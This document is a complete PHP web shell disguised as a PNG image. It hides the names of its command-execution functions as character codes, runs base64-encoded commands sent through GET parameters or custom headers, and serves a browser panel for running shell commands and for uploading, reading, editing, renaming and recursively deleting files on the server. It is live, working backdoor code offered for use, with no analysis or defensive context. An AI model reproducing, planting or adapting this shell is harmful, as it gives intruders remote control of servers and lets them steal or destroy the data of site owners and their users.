<?php echo '‰PNG';
@ini_set('display_errors',0);error_reporting(0);
if(!isset($_GET['ui'])&&!isset($_GET['a'])&&!isset($_FILES['u'])){header('Content-Type:text/plain');echo'ok!';exit;}
function _g($k){return isset($_GET[$k])?$_GET[$k]:(isset($_SERVER['HTTP_X_'.strtoupper($k)])?$_SERVER['HTTP_X_'.strtoupper($k)]:null);}
function _p(){return file_get_contents('php://input');}
function _fn($b){return implode('',array_map('chr',$b));}
function _run($c){
    if(!is_string($c)||trim($c)==='')return false;$dec=@base64_decode($c,true);
    if($dec!==false&&base64_encode($dec)===$c)$c=$dec;$c=trim($c);
    $fns=[_fn([112,111,112,101,110]),_fn([112,114,111,99,95,111,112,101,110]),_fn([115,121,115,116,101,109]),_fn([112,97,115,115,116,104,114,117]),_fn([115,104,101,108,108,95,101,120,101,99])];
    $dis=array_map('trim',explode(',',@ini_get('disable_functions')));
    foreach($fns as $i=>$f){if(function_exists($f)&&!in_array($f,$dis)){try{
        if($i===0){$h=@$f($c.' 2>&1','r');if($h){$o=stream_get_contents($h);pclose($h);if($o!==false)return $o;}}
        elseif($i===1){$d=[1=>['pipe','w'],2=>['pipe','w']];$p=@$f($c.' 2>&1',$d,$pipes);if(is_resource($p)){$o=stream_get_contents($pipes[1]);@fclose($pipes[1]);@fclose($pipes[2]);proc_close($p);if($o!==false)return $o;}}
        elseif($i>=2){ob_start();@$f($c);$o=ob_get_clean();if($o!==false)return $o;}
    }catch(\Throwable $e){continue;}}}return false;
}
$dir=_g('p')?:getcwd();$act=_g('a');$file=_g('f');
if($act){
    header('Content-Type:application/json');$out=['ok'=>false];
    if($act==='cmd'){$c=_g('c');$res=_run($c);if($res!==false){$out['ok']=true;$out['out']=$res;}else{$out['err']='exec disabled';}}
    elseif($act==='del'){$t=rtrim($dir,'/\\').'/'.$file;if(is_dir($t)){$i=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($t,FilesystemIterator::SKIP_DOTS),RecursiveIteratorIterator::CHILD_FIRST);foreach($i as $x){if($x->isDir())@rmdir($x->getPathname());else @unlink($x->getPathname());}$r=@rmdir($t);}else{$r=@unlink($t);}if($r)$out['ok']=true;else{$out['err']='del failed';}}
    elseif($act==='rename'){$new=_g('new');if(@rename(rtrim($dir,'/\\').'/'.$file,rtrim($dir,'/\\').'/'.$new))$out['ok']=true;else{$out['err']='rename failed';}}
    elseif($act==='upload'){
        if(isset($_FILES['u'])){
            $tmp=$_FILES['u']['tmp_name'];$name=basename($_FILES['u']['name']);$dest=rtrim($dir,'/\\').'/'.$name;
            if(@move_uploaded_file($tmp,$dest)){$out['ok']=true;$out['name']=$name;$out['size']=filesize($dest);}
            else{ $data=@file_get_contents($tmp); if($data!==false){$w=@file_put_contents($dest,$data);if($w!==false){$out['ok']=true;$out['name']=$name;$out['size']=$w;}else{$out['err']='write failed';} } else{$out['err']='upload failed';} }
        }else{$out['err']='no file';}
    }
    elseif($act==='read'){$t=rtrim($dir,'/\\').'/'.$file;if(@is_file($t)){$c=@file_get_contents($t);if($c!==false){$out['ok']=true;$out['data']=base64_encode($c);}else{$out['err']='read failed';}}else{$out['err']='not a file';}}
    elseif($act==='write'){$t=rtrim($dir,'/\\').'/'.$file;$data=_p();if($data!==false&&@is_dir(dirname($t))){$w=@file_put_contents($t,$data);if($w!==false){$out['ok']=true;$out['size']=$w;}else{$out['err']='write failed';}}else{$out['err']='invalid path';}}
    echo json_encode($out);exit;
}
if(isset($_GET['ui'])){
    header('Content-Type:text/html;charset=utf-8');$h=@opendir($dir);$items=[];while(($f=@readdir($h))!==false){if($f!='.'&&$f!='..')$items[]=$f;}@closedir($h);sort($items);
    echo'<!DOCTYPE html><html><head><title>Index of '.htmlspecialchars($dir).'</title><style>body{font-family:monospace;background:#0a0f14;color:#00e5ff;margin:20px;font-size:14px}a{color:#00e5ff;text-decoration:none}input,textarea,button{background:#050a0f;color:#00e5ff;border:1px solid #008ba3;padding:5px;font-family:monospace}button:hover{background:#00e5ff;color:#000}pre{background:#111a22;border:1px solid #008ba3;padding:10px;color:#0f0;white-space:pre-wrap}table{width:100%;border-collapse:collapse;margin-top:20px}th,td{text-align:left;padding:5px;border-bottom:1px solid #1a2c3a}</style></head><body>';
    echo'<h3>Index of '.htmlspecialchars($dir).'</h3>';
    echo'<div style="margin-bottom:10px"><strong>Terminal:</strong><br><form id="fcmd" onsubmit="return run(event)"><input type="text" id="c" placeholder="Command..." style="width:70%"><button>Run</button></form><pre id="out" style="display:none"></pre></div>';
    echo'<div style="margin-bottom:10px"><strong>Upload:</strong><br><form id="fup" onsubmit="return up(event)" enctype="multipart/form-data"><input type="file" name="u" required><button>Upload</button></form></div>';
    echo'<table id="tbl"><thead><tr><th>Name</th><th>Size</th><th>Action</th></tr></thead><tbody>';
    if($dir!=='/'&&rtrim($dir,'/\\')!=='')echo'<tr><td colspan="3"><a href="?ui=1&p='.urlencode(dirname($dir)).'">[..] Parent Directory</a></td></tr>';
    foreach($items as $f){$fp=rtrim($dir,'/\\').'/'.$f;$is_dir=@is_dir($fp);$sz=$is_dir?'-':round(@filesize($fp)/1024,2).' KB';
        if($is_dir){echo'<tr id="row-'.md5($f).'"><td><a href="?ui=1&p='.urlencode($fp).'">📁 '.htmlspecialchars($f).'</a></td><td>-</td><td><button onclick="del(\''.addslashes($f).'\')">Del</button></td></tr>';}
        else{echo'<tr id="row-'.md5($f).'"><td>📄 '.htmlspecialchars($f).'</td><td>'.$sz.'</td><td><button onclick="ed(\''.addslashes($f).'\')">Edit</button><button onclick="rn(\''.addslashes($f).'\')">Rename</button><button onclick="del(\''.addslashes($f).'\')">Del</button></td></tr>';}
    }
    echo'</tbody></table><div id="eb" style="display:none;margin-top:20px"><h4 id="et">Edit</h4><textarea id="ea" rows="15" style="width:100%"></textarea><br><button onclick="sv()">Save</button><button onclick="document.getElementById(\'eb\').style.display=\'none\'">Cancel</button></div><pre id="jr" style="display:none;position:fixed;bottom:10px;right:10px;z-index:999;box-shadow:0 0 10px #00e5ff"></pre><script>';
    echo'const D="'.addslashes($dir).'";let CF="";
    function show(d){let b=document.getElementById("jr");b.style.display="block";b.innerText=JSON.stringify(d,null,2);setTimeout(()=>b.style.display="none",4000);}
    function req(a,f="",p=null,isPost=false){let u=`?a=${a}&p=${encodeURIComponent(D)}&f=${encodeURIComponent(f)}`;let o={method:isPost?"POST":"GET",headers:{"X-Requested-With":"XMLHttpRequest"}};if(p)o.body=p;return fetch(u,o).then(r=>r.json()).then(d=>{show(d);return d;}).catch(e=>{show({ok:false,err:e.message});return {ok:false};});}
    function run(e){e.preventDefault();let c=document.getElementById("c").value;let o=document.getElementById("out");o.style.display="block";o.innerText="Running...";req("cmd","","c="+encodeURIComponent(c),true).then(d=>{if(d&&d.ok)o.innerText=d.out;else o.innerText="Error: "+(d?d.err:"unknown");});return false;}
    function up(e){e.preventDefault();let fd=new FormData(e.target);req("upload","",fd,true).then(d=>{if(d&&d.ok){let t=document.createElement("tr");t.id="row-"+Math.random().toString(36).substr(2,9);t.innerHTML=`<td>📄 ${d.name}</td><td>${Math.round(d.size/1024)} KB</td><td><button onclick="ed(\'${d.name}\')">Edit</button><button onclick="rn(\'${d.name}\')">Rename</button><button onclick="del(\'${d.name}\')">Del</button></td>`;document.getElementById("tbl").querySelector("tbody").appendChild(t);e.target.reset();}});return false;}
    function del(f){if(confirm("Hapus "+f+"?")){req("del",f).then(d=>{if(d&&d.ok){let r=document.getElementById("row-"+md5(f));if(r)r.remove();}});}}
    function rn(f){let n=prompt("Rename "+f+" to:",f);if(n&&n!==f){req("rename",f,"new="+encodeURIComponent(n),true).then(d=>{if(d&&d.ok){location.reload();}});}}
    function ed(f){CF=f;req("read",f).then(d=>{if(d&&d.ok){try{let txt=atob(d.data.replace(/\\s/g,""));document.getElementById("et").innerText="Edit: "+f;document.getElementById("ea").value=txt;document.getElementById("eb").style.display="block";window.scrollTo(0,document.body.scrollHeight);}catch(e){alert("Decode error: "+e.message);}}else alert("Error: "+(d?d.err:"unknown"));});}
    function sv(){let c=document.getElementById("ea").value;req("write",CF,c,true).then(d=>{if(d&&d.ok){alert("Saved!");document.getElementById("eb").style.display="none";}});}
    function md5(s){return "row-"+s.replace(/[^a-z0-9]/gi,"");}
    </script></body></html>';
    exit;
}
echo 'ok!';